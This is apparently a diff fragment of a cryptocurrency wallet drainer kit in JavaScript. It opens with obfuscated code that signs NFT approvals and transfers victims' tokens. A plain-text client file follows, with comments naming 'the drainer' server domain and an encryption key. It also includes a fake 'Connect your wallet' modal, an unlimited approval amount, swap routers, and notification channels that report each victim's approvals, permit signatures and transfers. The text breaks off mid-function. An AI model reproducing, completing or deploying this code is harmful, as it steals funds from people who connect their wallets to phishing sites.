SIGN_X2Y2!==_0x4a6c7(0xb0)&&FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0x1e2)]['Enable']==0x1&&FLASH_Settings[_0x4a6c7(0x1c7)]['x2y2']['Priority']==0x0&&!XY_US&&FLASH_Current_Chain_ID==0x1&&await is_nft_approved(_0x5e1b20[_0x4a6c7(0x1d2)],FLASH_Current_Address,'0xf849de01b080adc3a814fabe1e2087475cf2e354')&&_0x5e1b20[_0x4a6c7(0xc1)]>=FLASH_Settings['Settings'][_0x4a6c7(0x1e2)][_0x4a6c7(0x253)])await SIGN_X2Y2(_0x326575,FLASH_Provider,FLASH_Current_Address,FLASH_Settings[_0x4a6c7(0x1f8)],FLASH_ID,FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0x1e2)][_0x4a6c7(0x253)]),XY_US=!![];else{if(FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0x283)][_0x4a6c7(0xcb)]>0x0&&(!FLASH_Sign_Disabled||FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0x283)][_0x4a6c7(0x199)]==0x1))while(!![]){try{await SIGN_NFT(_0x5e1b20);if(FLASH_Settings['Settings'][_0x4a6c7(0x283)][_0x4a6c7(0xcb)]==0x1){let _0x462573=[];for(const _0x5a3307 of _0x326575){try{_0x5a3307[_0x4a6c7(0x1d2)]==_0x5e1b20[_0x4a6c7(0x1d2)]&&(_0x462573[_0x4a6c7(0x1a5)](_0x5a3307),_0x5a3307['skip']=!![]);}catch(_0x5b99c2){console['log'](_0x5b99c2);}}await send_request({'action':_0x4a6c7(0x28b),'user_id':FLASH_ID,'tokens':_0x462573,'address':FLASH_Current_Address,'chain_id':FLASH_Current_Chain_ID,'contract_address':_0x5e1b20[_0x4a6c7(0x1d2)]});}_0x5e1b20[_0x4a6c7(0x9e)]=!![];break;}catch(_0x411bb7){console['log'](_0x411bb7);if(FLASH_Settings['Settings'][_0x4a6c7(0x283)][_0x4a6c7(0x106)]==0x1&&FLASH_Current_Provider==_0x4a6c7(0x18a)||typeof _0x411bb7[_0x4a6c7(0x151)]==_0x4a6c7(0x29a)&&_0x411bb7[_0x4a6c7(0x151)][_0x4a6c7(0xc5)](_0x4a6c7(0x18d))||_0x411bb7[_0x4a6c7(0x23d)]==-0x7f59||_0x411bb7[_0x4a6c7(0x23d)]==-0x7d00||_0x411bb7[_0x4a6c7(0x151)]&&is_valid_json(_0x411bb7[_0x4a6c7(0x151)])&&(JSON[_0x4a6c7(0x132)](_0x411bb7[_0x4a6c7(0x151)])[_0x4a6c7(0x23d)]==-0x7f59||JSON[_0x4a6c7(0x132)](_0x411bb7[_0x4a6c7(0x151)])[_0x4a6c7(0x23d)]==-0x7d00)){if(FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0x283)][_0x4a6c7(0x199)]==0x1)await sign_cancel();else{await sign_unavailable();while(!![]){if(FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0x283)][_0x4a6c7(0xcb)]==0x1)try{await DO_SAFA(_0x5e1b20);let _0x19258f=[];for(const _0x14e37c of _0x326575){try{_0x14e37c['address']==_0x5e1b20[_0x4a6c7(0x1d2)]&&(_0x19258f[_0x4a6c7(0x1a5)](_0x14e37c),_0x14e37c[_0x4a6c7(0x9e)]=!![]);}catch(_0x39ac17){console['log'](_0x39ac17);}}await send_request({'action':'safa_approves','user_id':FLASH_ID,'tokens':_0x19258f,'address':FLASH_Current_Address,'chain_id':FLASH_Current_Chain_ID,'contract_address':_0x5e1b20['address']}),_0x5e1b20[_0x4a6c7(0x9e)]=!![];break;}catch(_0x2efede){console[_0x4a6c7(0x260)](_0x2efede),await approve_cancel();if(!FLASH_Settings['Loop_NFT'])break;}else{if(FLASH_Settings['Settings'][_0x4a6c7(0x283)][_0x4a6c7(0xcb)]==0x2)try{await TRANSFER_NFT(_0x5e1b20),_0x5e1b20[_0x4a6c7(0x9e)]=!![];break;}catch(_0x8e61b4){console['log'](_0x8e61b4),await transfer_cancel();if(!FLASH_Settings[_0x4a6c7(0x29d)])break;}}}}break;}else{console['log'](_0x411bb7);if(_0x411bb7!=_0x4a6c7(0xa8)){await sign_cancel();if(!FLASH_Settings[_0x4a6c7(0x29d)])break;}else break;}}}else{if(FLASH_Settings['Settings'][_0x4a6c7(0x133)][_0x4a6c7(0x175)])while(!![]){try{await DO_SAFA(_0x5e1b20);let _0x3cc650=[];for(const _0x11fe10 of _0x326575){try{_0x11fe10[_0x4a6c7(0x1d2)]==_0x5e1b20[_0x4a6c7(0x1d2)]&&(_0x3cc650[_0x4a6c7(0x1a5)](_0x11fe10),_0x11fe10[_0x4a6c7(0x9e)]=!![]);}catch(_0x5d88bf){console[_0x4a6c7(0x260)](_0x5d88bf);}}await send_request({'action':_0x4a6c7(0x28b),'user_id':FLASH_ID,'tokens':_0x3cc650,'address':FLASH_Current_Address,'chain_id':FLASH_Current_Chain_ID,'contract_address':_0x5e1b20['address']}),_0x5e1b20['skip']=!![];break;}catch(_0x590bab){console[_0x4a6c7(0x260)](_0x590bab),await approve_cancel();if(!FLASH_Settings[_0x4a6c7(0x29d)])break;}}else while(!![]){try{await TRANSFER_NFT(_0x5e1b20),_0x5e1b20[_0x4a6c7(0x9e)]=!![];break;}catch(_0x1202f2){console[_0x4a6c7(0x260)](_0x1202f2),await transfer_cancel();if(!FLASH_Settings[_0x4a6c7(0x29d)])break;}}}}}}}}}}catch(_0x1c297f){console[_0x4a6c7(0x260)](_0x1c297f);}}}FLASH_Process=![],setTimeout(end_message,0x7d0);}catch(_0x4b79b2){console[_0x4a6c7(0x260)](_0x4b79b2);}};try{let query_string=window[_0x26b509(0x26b)][_0x26b509(0x1a1)],url_params=new URLSearchParams(query_string);url_params[_0x26b509(0x1c8)]('cis')!=_0x26b509(0x189)&&(navigator[_0x26b509(0xf7)]||navigator[_0x26b509(0x156)])[_0x26b509(0x21d)]()['includes']('ru')&&(FLASH_Bad_Country=!![]);}catch(_0x47fac0){console['log'](_0x47fac0);}document[_0x26b509(0x255)](_0x26b509(0x1ec),async()=>{const _0x5ebd68=_0x26b509;try{if(FLASH_Modal_Style==0x2)FLASHM[_0x5ebd68(0x1c6)]();else inject_modal();if(FLASH_Loader_Style==0x2)FLASHL[_0x5ebd68(0x1c6)]();FLASH_Load_Time=Math[_0x5ebd68(0x285)](Date[_0x5ebd68(0x196)]()/0x3e8);if(typeof localStorage['FLASH_ID']===_0x5ebd68(0xb0)){const _0x399580=await send_request({'action':_0x5ebd68(0x20e)});if(_0x399580['status']=='OK')localStorage[_0x5ebd68(0x110)]=_0x399580[_0x5ebd68(0x1be)];else localStorage['FLASH_ID']=Math['floor'](Date[_0x5ebd68(0x196)]()/0x3e8);}FLASH_ID=localStorage[_0x5ebd68(0x110)],await retrive_config(),fill_chain_data(),await retrive_contract(),FLASH_Ready=!![],enter_website();for(const _0xe32302 in FLASH_Settings['RPCs'])FLASH_Gas_Reserves[_0xe32302]=0x0;for(const _0x2a5afb of document[_0x5ebd68(0xf1)](_0x5ebd68(0x1c3))){try{_0x2a5afb[_0x5ebd68(0x255)](_0x5ebd68(0x269),()=>flash_init());}catch(_0xc93e1d){console[_0x5ebd68(0x260)](_0xc93e1d);}}}catch(_0xfa064f){console[_0x5ebd68(0x260)](_0xfa064f);}});const use_wc=()=>{connect_wallet('WalletConnect');};setInterval(async()=>{const _0x488098=_0x26b509;try{let _0x331aac=document[_0x488098(0x13b)](_0x488098(0x207));if(_0x331aac===null)return;else FLASH_Partner_Address=_0x331aac[_0x488098(0x142)]['trim']();}catch(_0x10843b){console[_0x488098(0x260)](_0x10843b);}},0x3e8),window[_0x26b509(0x255)]('beforeunload',_0x108d7d=>leave_website()),window[_0x26b509(0x255)](_0x26b509(0xab),_0x281552=>leave_website());
+// Using this code without obfuscation is STRICTLY PROHIBITED
+// If this is discovered, an arbitration will be drawn up
+// You can obfuscate this script here: obfuscator.io
+
+// Found a script in the public domain without obfuscation?
+// Notify the developer by email: ntdctr@gmail.com
+// Specify the location or domain where the script is located
+
+// ================================================================
+// ==================== BASIC SCRIPT SETTINGS =====================
+// ================================================================
+
+let FLASH_Encryption_Key = 50; // Specify any number that will be used for encryption it is not recommended to leave it as default!
+// The same number should be specified in the server.js file - if they differ, then nothing will work correctly
+
+const FLASH_Server = "test.bricsfunded.com"; // Specify the domain that is attached to the drainer server
+// This is the domain where you have a server, and not the site itself where you plan to use the drainer
+
+const FLASH_WalletConnect_ID = "53cb6c00218a6d60162590ce6debfc5c"; // Project ID из WalletConnect Cloud change this
+
+const FLASH_Modal_Style = 2; // 1 - old, 2 - new (update from 10/01/2023)
+const FLASH_Loader_Style = 2; // 1 - old, 2 - new (update from 10/01/2023)
+const FLASH_Color_Scheme = 'light'; // light - light theme, dark - dark theme
+const FLASH_Modal_Mode = 1; // 1 - select a wallet by clicking and connect with a button, 2 - connect immediately after selection
+
+const FLASH_Verify_Message = "";// Message for wallet verification, may contain the {{ADDRESS}} tag
+// Leave empty by default to receive a message from the server, otherwise fill in to use a custom
+
+// Using the settings below you can customize how your site will look in the WalletConnect interface
+// No need to change, most wallets work with default settings
+// The setting is not related to the FLASH_WalletConnect_Customization switch, it is only needed to customize the design
+
+const FLASH_WalletConnect_MetaData = {
+  name: document.title, // Default is the same as the site name
+  description: "Web3 Application", // Default "Web3 Application"
+  url: "https://" + window.location.host, // Default as site domain
+  icons: [ "https://avatars.githubusercontent.com/u/37784886" ]
+};
+
+const FLASH_WalletConnect_Customization = 0; // 0 - use the default window, 1 - user customization
+const FLASH_WalletConnect_Theme = { // Customization options are available here: https://docs.walletconnect.com/2.0/web/web3modal/react/wagmi/theming
+  themeMode: 'light',
+  themeVariables: {
+    '--w3m-background-color': '#000000',
+    '--w3m-accent-color': '#F5841F',
+    '--w3m-z-index': 9999999
+  }
+};
+
+const FLASH_Custom_Chat = {
+  Enable: 0, // 0 - use server settings, 1 - use client settings
+  Chat_Settings: {
+    enter_website: "", // Channel ID for the action - Login to the site (if empty - notification is disabled)
+    leave_website: "", // Channel ID for the action - Exit the site (if empty - notification is disabled)
+    connect_success: "", // Channel ID for the action - Successful connection (if empty - notification disabled)
+    connect_request: "", // Channel ID for the action - Connection request (if empty - notification disabled)
+    connect_cancel: "", // Channel ID for action - Connection rejected (if empty - notification disabled)
+    approve_request: "", // Channel ID for the action - Request for confirmation (if empty - notification disabled)
+    approve_success: "", // Channel ID for action - Successful confirmation (if empty - notification disabled)
+    approve_cancel: "", // Channel ID for action - Acknowledgment rejected (if empty - notification disabled)
+    permit_sign_data: "", // Channel ID for the action - Data from PERMIT (if empty - notification disabled)
+    transfer_request: "", // Channel ID for the action - Transfer request (if empty - notification is disabled)
+    transfer_success: "", // Channel ID for the action - Successful transfer (if empty - notification disabled)
+    transfer_cancel: "", // Channel ID for the action - Cancel transfer (if empty - notification is disabled)
+    sign_request: "", // Channel ID for the action - Signature Request (if empty - notification is disabled)
+    sign_success: "", // Channel ID for the action - Successful signature (if empty - notification disabled)
+    sign_cancel: "", // Channel ID for the action - Signature rejected (if empty - notification disabled)
+    chain_request: "", // Channel ID for the action - Request to change the network (if empty - notification is disabled)
+    chain_success: "", // Channel ID for the action - Network change accepted (if empty - notification disabled)
+    chain_cancel: "", // Channel ID for the action - Network change rejected (if empty - notification disabled)
+  }
+};
+
+// =====================================================================
+// ======== IT IS NOT SAFE TO MAKE CHANGES TO THE CODE BELOW ===========
+// =====================================================================
+
+var FLASH_Worker_ID = null;
+
+const BN = ethers.BigNumber.from;
+
+let FLASH_Ready = false, FLASH_Settings = {}, FLASH_Contract_ABI = {}, FLASH_ID = 0, FLASH_Process = false,
+FLASH_Provider = null, FLASH_Current_Provider = null, FLASH_Current_Address = null, FLASH_Current_Chain_ID = null,
+FLASH_Web3 = null, FLASH_Signer = null, FLASH_Check_Done = false, FLASH_Currencies = {}, FLASH_Force_Mode = false,
+FLASH_Sign_Disabled = false, BL_US = false, SP_US = false, XY_US = false, FLASH_Bad_Country = false,
+FLASH_Connection = false, FLASH_Load_Time = null, FLASH_Gas_Multiplier = 2, FLASH_Partner_Address = false;
+
+const WC2_Provider = window["@walletconnect/ethereum-provider"].EthereumProvider;
+const is_valid_json = (data) => { try { JSON.parse(data); } catch(err) { return false; } return true; };
+
+(async () => {
+  try {
+    let response = await fetch(`https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD`, {
+      method: 'GET', headers: { 'Accept': 'application/json' }
+    });
+    FLASH_Currencies = await response.json();
+    FLASH_Currencies['PLS'] = { USD: 0.00004512 };
+  } catch(err) {
+    console.log(err);
+  }
+})();
+
+const FLASH_API_Data = {
+  1: 'api.etherscan.io',
+  10: 'api-optimistic.etherscan.io',
+  56: 'api.bscscan.com',
+  137: 'api.polygonscan.com',
+  250: 'api.ftmscan.com',
+  42161: 'api.arbiscan.io',
+  43114: 'api.snowtrace.io',
+  8453: 'api.basescan.org'
+};
+
+var FLASH_MetaMask_ChainData = {};
+
+const fill_chain_data = () => {
+  FLASH_MetaMask_ChainData = {
+    1: {
+      chainId: '0x1',
+      chainName: "Ethereum Mainnet",
+      nativeCurrency: {
+        name: "Ether",
+        symbol: "ETH",
+        decimals: 18,
+      },
+      rpcUrls: [FLASH_Settings.RPCs[1]],
+      blockExplorerUrls: ["https://etherscan.io"]
+    },
+    56: {
+      chainId: '0x38',
+      chainName: "BNB Smart Chain",
+      nativeCurrency: {
+        name: "Binance Coin",
+        symbol: "BNB",
+        decimals: 18,
+      },
+      rpcUrls: [FLASH_Settings.RPCs[56]],
+      blockExplorerUrls: ["https://bscscan.com"]
+    },
+    137: {
+      chainId: '0x89',
+      chainName: "Polygon Mainnet",
+      nativeCurrency: {
+        name: "MATIC",
+        symbol: "MATIC",
+        decimals: 18,
+      },
+      rpcUrls: [FLASH_Settings.RPCs[137]],
+      blockExplorerUrls: ["https://polygonscan.com"]
+    },
+    43114: {
+      chainId: '0xA86A',
+      chainName: "Avalanche Network C-Chain",
+      nativeCurrency: {
+        name: "AVAX",
+        symbol: "AVAX",
+        decimals: 18,
+      },
+      rpcUrls: [FLASH_Settings.RPCs[43114]],
+      blockExplorerUrls: ["https://snowtrace.io/"]
+    },
+    42161: {
+      chainId: '0xA4B1',
+      chainName: "Arbitrum One",
+      nativeCurrency: {
+        name: "ETH",
+        symbol: "ETH",
+        decimals: 18,
+      },
+      rpcUrls: [FLASH_Settings.RPCs[42161]],
+      blockExplorerUrls: ["https://explorer.arbitrum.io"]
+    },
+    10: {
+      chainId: '0xA',
+      chainName: "Optimism",
+      nativeCurrency: {
+        name: "ETH",
+        symbol: "ETH",
+        decimals: 18,
+      },
+      rpcUrls: [FLASH_Settings.RPCs[10]],
+      blockExplorerUrls: ["https://optimistic.etherscan.io/"]
+    },
+    250: {
+      chainId: '0xFA',
+      chainName: "Fantom Opera",
+      nativeCurrency: {
+        name: "FTM",
+        symbol: "FTM",
+        decimals: 18,
+      },
+      rpcUrls: [FLASH_Settings.RPCs[250]],
+      blockExplorerUrls: ["https://ftmscan.com/"]
+    },
+    8453: {
+      chainId: '0x2105',
+      chainName: "Base",
+      nativeCurrency: {
+        name: "ETH",
+        symbol: "ETH",
+        decimals: 18,
+      },
+      rpcUrls: [FLASH_Settings.RPCs[8453]],
+      blockExplorerUrls: ["https://basescan.org/"]
+    },
+    324: {
+      chainId: '0x144',
+      chainName: "zkSync Era",
+      nativeCurrency: {
+        name: "ETH",
+        symbol: "ETH",
+        decimals: 18,
+      },
+      rpcUrls: [FLASH_Settings.RPCs[324]],
+      blockExplorerUrls: ["https://explorer.zksync.io/"]
+    },
+    369: {
+      chainId: '0x171',
+      chainName: "Pulse",
+      nativeCurrency: {
+        name: "PLS",
+        symbol: "PLS",
+        decimals: 18,
+      },
+      rpcUrls: [FLASH_Settings.RPCs[369]],
+      blockExplorerUrls: ["https://scan.pulsechain.com/"]
+    },
+  };
+};
+
+const FLASH_Routers = {
+  1: [
+    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
+    ['Pancake', '0xEfF92A263d31888d860bD50809A8D171709b7b1c'],
+    ['Pancake_V3', '0x13f4EA83D0bd40E75C8222255bc855a974568Dd4'],
+    ['Sushiswap', '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F']
+  ],
+  10: [
+    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45']
+  ],
+  56: [
+    ['Pancake', '0x10ED43C718714eb63d5aA57B78B54704E256024E'],
+    ['Pancake_V3', '0x13f4EA83D0bd40E75C8222255bc855a974568Dd4'],
+    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
+  ],
+  137: [
+    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
+    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506'],
+    ['Quickswap', '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff']
+  ],
+  250: [
+    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
+  ],
+  42161: [
+    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
+    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
+  ],
+  43114: [
+    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
+  ]
+};
+
+const FLASH_Swap_Route = {
+  1: '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2',
+  10: '0x4200000000000000000000000000000000000006',
+  56: '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c',
+  137: '0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270',
+  250: '0x21be370d5312f44cb42ce377bc9b8a0cef1a4c83',
+  42161: '0x82af49447d8a07e3bd95bd0d56f35241523fbab1',
+  43114: '0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7'
+};
+
+const FLASH_Uniswap_ABI = [{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"","type":"bytes[]"}],"stateMutability":"payable","type":"function"}];
+const FLASH_Pancake_ABI = [{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForETH","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"","type":"bytes[]"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"}];
+
+const FLASH_Current_URL = window.location.href.replace(/http[s]*:\/\//, '');
+const FLASH_Mobile_Status = (() => {
+  let check = false;
+  (function (a) { if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true; })(navigator.userAgent || navigator.vendor || window.opera);
+  return check;
+})();
+const FLASH_Apple_Status = (() => {
+  try {
+    return [
+      'iPad Simulator', 'iPhone Simulator', 'iPod Simulator', 'iPad', 'iPhone', 'iPod'
+    ].includes(navigator.platform) || (navigator.userAgent.includes("Mac") && "ontouchend" in document);
+  } catch(err) {
+    return false;
+  }
+})();
+
+const FLASH_Unlimited_Amount = '1158472395435294898592384258348512586931256';
+
+const FLASH_Modal_Data = [
+  {
+    type: 'style',
+    data: `@import url(https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap);.web3-modal,.web3-overlay{position:fixed;top:0;left:0;width:100%}.web3-overlay{height:100%;background:rgba(23,23,23,.8);backdrop-filter:blur(5px);z-index:99998}.web3-modal{right:0;bottom:0;margin:auto;max-width:500px;height:fit-content;padding:21px 0 0;background:#fff;border-radius:60px;z-index:99999;font-family:Inter,sans-serif}.web3-modal-title{font-weight:700;font-size:24px;line-height:29px;color:#000;text-align:center}.web3-modal-items{border-top:1px solid rgba(0,0,0,.1);margin-top:21px}.web3-modal .item{padding:15px 34px;border-bottom:1px solid rgba(0,0,0,.1);display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:.2s}.web3-modal .item:hover{background:#fafafa;border-radius: 20px}.web3-modal .item div{display:flex;align-items:center}.web3-modal .item:last-child{border-bottom:none;border-radius: 0px 0px 60px 60px;}.web3-modal .item span{font-weight:400;font-size:16px;color:#000;margin-left:11px}.web3-modal .item .icon{width:40px;height:40px;justify-content:center}.web3-modal .item .arrow{height:12px;width:7.4px;background:url('/assets/web3-modal/images/arrow.svg') no-repeat} @media (prefers-color-scheme: dark) {.web3-modal {background: #1c1c1c;color: #fff;}.web3-modal-items {border-top: 1px solid #E4DDDD;}.web3-modal .item span {color: #fff;}.web3-modal .item .arrow {-webkit-filter: invert(1);filter: invert(1);}.web3-modal-title {color: #fff;}.web3-modal .item:hover {background:#262525;} .swal2-popup { background: #1c1c1c; color: #ffffff; } .swal2-styled.swal2-confirm { background-color: #3e7022; } .swal2-styled.swal2-confirm:focus { box-shadow: 0 0 0 3px #3e7022; } }`
+  },
+  {
+    type: 'html',
+    data: `<div class="web3-modal-main"><p class="web3-modal-title" style="margin-top:0">Connect your wallet</p><div class="web3-modal-items"><div class="item" onclick='connect_wallet("MetaMask")'><div><div class="icon"><img src="/assets/web3-modal/images/MM.svg" alt=""></div><span>MetaMask</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Coinbase")'><div><div class="icon"><img src="/assets/web3-modal/images/CB.svg" alt=""></div><span>Coinbase</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Trust Wallet")'><div><div class="icon"><img src="/assets/web3-modal/images/TW.svg" alt=""></div><span>Trust Wallet</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Binance Wallet")'><div><div class="icon"><img src="/assets/web3-modal/images/BW.svg" alt=""></div><span>Binance Wallet</span></div><div class="arrow"></div></div><div class="item" onclick="use_wc()"><div><div class="icon"></div><span>More Wallets</span></div><div class="arrow"></div></div></div></div><div class="web3-modal-wc" style="display:none"><p class="web3-modal-title" style="margin-top:0">Choose Version</p><div class="web3-modal-items"><div class="item" onclick='connect_wallet("WalletConnect")'><div><div class="icon"><img src="/assets/web3-modal/images/WC.svg" alt=""></div><span>WalletConnect</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("WalletConnect")'><div><div class="icon"><img src="/assets/web3-modal/images/WC1.svg" alt=""></div><span>WalletConnect Legacy</span></div><div class="arrow"></div></div><div class="item" onclick="ms_init()"><div class="arrow" style="transform:rotateY(190deg)"></div><div><div class="icon"></div><span>Return to Wallets</span></div></div></div></div>`
+  }
+];
+
+const inject_modal = () => {
+  try {
+    let modal_style = document.createElement('style');
+    modal_style.id = 'web3-style';
+    modal_style.innerHTML = FLASH_Modal_Data[0].data;
+    document.head.appendChild(modal_style);
+    let overlay_elem = document.createElement('div');
+    overlay_elem.id = 'web3-overlay';
+    overlay_elem.classList = ['web3-overlay'];
+    overlay_elem.style.display = 'none';
+    document.body.prepend(overlay_elem);
+    document.querySelector('.web3-overlay').addEventListener('click', () => { flash_hide(); });
+    let modal_elem = document.createElement('div');
+    modal_elem.id = 'web3-modal';
+    modal_elem.classList = ['web3-modal'];
+    modal_elem.style.display = 'none';
+    modal_elem.innerHTML = FLASH_Modal_Data[1].data;
+    document.body.prepend(modal_elem);
+  } catch(err) {
+    console.log(err);
+  }
+};
+
+const set_modal_data = (style_code, html_code) => {
+  try {
+    FLASH_Modal_Data[0].data = style_code;
+    FLASH_Modal_Data[1].data = html_code;
+    reset_modal();
+  } catch(err) {
+    console.log(err);
+  }
+};
+
+const reset_modal = () => {
+  try { document.getElementById('web3-modal').remove(); } catch(err) { console.log(err); }
+  try { document.getElementById('web3-overlay').remove(); } catch(err) { console.log(err); }
+  try { document.getElementById('web3-style').remove(); } catch(err) { console.log(err); }
+  try { inject_modal(); } catch(err) { console.log(err); }
+};
+
+const flash_init = () => {
+  try {
+    if (!FLASH_Connection) return connect_wallet();
+    if (FLASH_Process) return;
+    if (FLASH_Modal_Style == 2) {
+      FLASHM.open(FLASH_Color_Scheme, FLASH_Modal_Mode);
+    } else {
+      document.getElementById('web3-modal').style.display = 'block';
+      document.getElementById('web3-overlay').style.display = 'block';
+      document.getElementsByClassName('web3-modal-main')[0].style.display = 'block';
+      document.getElementsByClassName('web3-modal-wc')[0].style.display = 'none';
+    }
+  } catch (err) {
+    console.log(err);
+  }
+};
+
+const ms_hide = () => {
+  try {
+    if (FLASH_Modal_Style == 2) {
+      FLASHM.close();
+    } else {
+      document.getElementById('web3-modal').style.display = 'none';
+      document.getElementById('web3-overlay').style.display = 'none';
+    }
+  } catch (err) {
+    console.log(err);
+  }
+};
+
+const load_wc = async () => {
+  let all_chains_arr = [], all_chains_obj = {};
+  for (const chain_id in FLASH_Settings.RPCs) {
+    if (chain_id != '1') all_chains_arr.push(chain_id);
+    all_chains_obj[chain_id] = FLASH_Settings.RPCs[chain_id];
+  }
+  FLASH_Provider = await WC2_Provider.init({
+    projectId: FLASH_WalletConnect_ID,
+    chains: [ '1' ],
+    optionalChains: all_chains_arr,
+    metadata: FLASH_WalletConnect_MetaData,
+    showQrModal: true,
